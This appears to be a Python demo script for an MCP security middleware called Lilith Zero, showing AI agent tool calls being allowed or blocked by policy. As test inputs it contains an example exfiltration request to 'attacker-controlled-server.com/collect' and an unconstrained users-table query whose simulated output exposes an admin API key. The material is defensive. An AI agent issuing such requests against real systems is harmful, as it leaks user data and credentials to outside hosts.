"""
Lilith Zero - Professional Security Demonstration (Technical Mode)
Optimized for live architectural reviews.

Showcases:
1. Real-time Policy Enforcement vs. Legacy Infrastructure.
2. Mitigation of RLS Bypass (CVE-2025-48757).
3. Runtime Network Isolation via MCP Middleware.
"""

import asyncio
import os
import sys
import logging
from typing import Dict, Any

# --- Terminal Aesthetics ---
class Colors:
    CYAN = "\033[96m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    BOLD = "\033[1m"
    GRAY = "\033[90m"
    BLUE = "\033[94m"
    RESET = "\033[0m"

# Configure professional logging with custom branding
class DemoFormatter(logging.Formatter):
    def format(self, record):
        prefix = f"{Colors.GRAY}[{logging.getLevelName(record.levelno)}]{Colors.RESET} "
        if record.levelno >= logging.ERROR:
            return f"{prefix}{Colors.RED}{record.msg}{Colors.RESET}"
        if record.levelno == logging.WARNING:
            return f"{prefix}{Colors.YELLOW}{record.msg}{Colors.RESET}"
        return f"{prefix}{record.msg}"

# Initialize logger
handler = logging.StreamHandler()
handler.setFormatter(DemoFormatter())
logger = logging.getLogger("LilithDemo")
logger.addHandler(handler)
logger.setLevel(logging.INFO)
logger.propagate = False

try:
    from lilith_zero import Lilith
    from lilith_zero.exceptions import PolicyViolationError, LilithConnectionError
except ImportError:
    print(f"{Colors.RED}SDK 'lilith_zero' not found. Please run the setup script first.{Colors.RESET}")
    sys.exit(1)

# Paths
_EXT = ".exe" if os.name == "nt" else ""
LILITH_BINARY = os.path.abspath(f"lilith-zero/target/release/lilith-zero{_EXT}")
# Using the demo policy in the current directory
POLICY_FILE = os.path.abspath(os.path.join(os.path.dirname(__file__), "demo_policy.yaml"))
SERVER_SCRIPT = os.path.abspath(os.path.join(os.path.dirname(__file__), "vulnerable_server.py"))

async def run_scenario(name: str, objective: str, tool: str, args: Dict[str, Any], expect_block: bool = True):
    print(f"\n{Colors.BLUE}{Colors.BOLD}[" + "="*78 + "]" + f"{Colors.RESET}")
    print(f"{Colors.BLUE}{Colors.BOLD} SCENARIO : {name:<67}{Colors.RESET}")
    print(f"{Colors.BLUE}{Colors.BOLD} OBJECTIVE: {objective:<67}{Colors.RESET}")
    print(f"{Colors.BLUE}{Colors.BOLD}[" + "="*78 + "]" + f"{Colors.RESET}")

    if not os.path.exists(LILITH_BINARY):
        logger.error(f"Binary missing at {LILITH_BINARY}. Build required.")
        return

    logger.info("Initializing MCP Security Middleware...")
    
    try:
        async with Lilith(
            upstream=f"python {SERVER_SCRIPT}",
            policy=POLICY_FILE,
            binary=LILITH_BINARY
        ) as client:
            
            logger.info(f"{Colors.GREEN}Handshake complete. Context-aware security session established.{Colors.RESET}")
            logger.info(f"Agent Request: Call {Colors.BOLD}{tool}{Colors.RESET} with parameters {args}")
            
            try:
                result = await client.call_tool(tool, args)
                if expect_block:
                    logger.error("VULNERABILITY EXPOSED: Request permitted through middleware.")
                else:
                    logger.info(f"{Colors.GREEN}REQUEST PERMITTED: Response processed via secure channel.{Colors.RESET}")
                    print(f"\n{Colors.GRAY}Middleware Output:{Colors.RESET} {result}")
                    
                    # Extract and clean content for presentation
                    try:
                        import re
                        raw_text = result['content'][0]['text']
                        # Strip Lilith Spotlighting Delimiters
                        clean_text = re.sub(r'<<<LILITH_ZERO_DATA_(START|END):[a-zA-Z0-9]+>>>', '', raw_text).strip()
                        print(f"{Colors.GREEN}{Colors.BOLD}Clean Response:{Colors.RESET} {clean_text}")
                    except (KeyError, IndexError, TypeError):
                        pass
            except PolicyViolationError as e:
                print(f"\n{Colors.RED}{Colors.BOLD}[SECURITY ENFORCED]{Colors.RESET}")
                print(f"{Colors.RED}Action:         DENY{Colors.RESET}")
                print(f"{Colors.RED}Reason:         {str(e)}{Colors.RESET}")
                print(f"{Colors.RED}Policy Logic:   Enforcing Least Privilege on Data Access.{Colors.RESET}")
            except Exception as e:
                logger.error(f"Runtime Exception: {e}")
                
    except LilithConnectionError as e:
        logger.error(f"Middleware Connection Failed: {e}")

async def show_vulnerability():
    print(f"\n{Colors.RED}{Colors.BOLD}[" + "="*78 + "]" + f"{Colors.RESET}")
    print(f"{Colors.RED}{Colors.BOLD} BASELINE: VULNERABLE AGENT INTERACTION (NO MIDDLEWARE)          {Colors.RESET}")
    print(f"\n{Colors.RED}{Colors.BOLD}[" + "="*78 + "]" + f"{Colors.RESET}")
    logger.warning("Simulating direct tool interaction with unprotected upstream server...")
    await asyncio.sleep(0.8)
    print(f"\n{Colors.RED}{Colors.BOLD}[UNAUTHORIZED DATA ACCESS SUCCESSFUL]{Colors.RESET}")
    print(f"{Colors.GRAY}Request: SELECT * FROM users{Colors.RESET}")
    print(f"{Colors.GRAY}--- UPSTREAM RESPONSE -----------------------{Colors.RESET}")
    print("[{'id': 1, 'username': 'admin', 'api_key': 'sk_live_88374'}, ...]")
    print(f"{Colors.GRAY}---------------------------------------------{Colors.RESET}")
    logger.critical(f"IMPACT: CVE-2025-48757 exploited. Database isolation bypassed.")

async def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"{Colors.CYAN}{Colors.BOLD}")
    print("  LILITH ZERO - MCP SECURITY MIDDLEWARE")
    print("  Technical Demonstration: Security for AI Agents")
    print(f"  {Colors.GRAY}Runtime Isolation & Policy Enforcement{Colors.RESET}")

    while True:
        print(f"\n{Colors.BOLD}Select Scenario:{Colors.RESET}")
        print(f"1. {Colors.RED}[Baseline]{Colors.RESET}  Expose RLS Bypass Vulnerability")
        print(f"2. {Colors.GREEN}[Protected]{Colors.RESET} Enforce SQL Containment (RLS Hardening)")
        print(f"3. {Colors.GREEN}[Protected]{Colors.RESET} Enforce Network Perimeter (Egress Control)")
        print(f"4. {Colors.GREEN}[Protected]{Colors.RESET} Verify Low-Latency Authorized Access")
        print(f"5. Exit")
        
        try:
            choice = input(f"\n{Colors.BOLD}Command > {Colors.RESET}").strip()
            
            if choice == '1':
                await show_vulnerability()
            elif choice == '2':
                await run_scenario(
                    "Data Access Control",
                    "Intercept unconstrained SQL queries at the runtime level.",
                    "execute_sql",
                    {"query": "SELECT * FROM users"}
                )
            elif choice == '3':
                await run_scenario(
                    "Egress Security",
                    "Block unauthorized network requests to untrusted endpoints.",
                    "fetch_url",
                    {"url": "http://attacker-controlled-server.com/collect"}
                )
            elif choice == '4':
                await run_scenario(
                    "Authorized Intelligence",
                    "Permit legitimate aggregated queries with zero-friction.",
                    "execute_sql",
                    {"query": "SELECT COUNT(*) FROM users"},
                    expect_block=False
                )
            elif choice == '5':
                print(f"{Colors.CYAN}Demo session terminated.{Colors.RESET}")
                sys.exit(0)
            else:
                print("Invalid command.")
                
        except (KeyboardInterrupt, EOFError):
            print(f"\n{Colors.GRAY}Terminating session...{Colors.RESET}")
            sys.exit(0)
        except SystemExit:
            raise
        except Exception as e:
            logger.error(f"Application Error: {e}")
        
        try:
             input(f"\n{Colors.GRAY}Press Enter to continue...{Colors.RESET}")
        except (KeyboardInterrupt, EOFError):
             sys.exit(0)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        sys.exit(0)
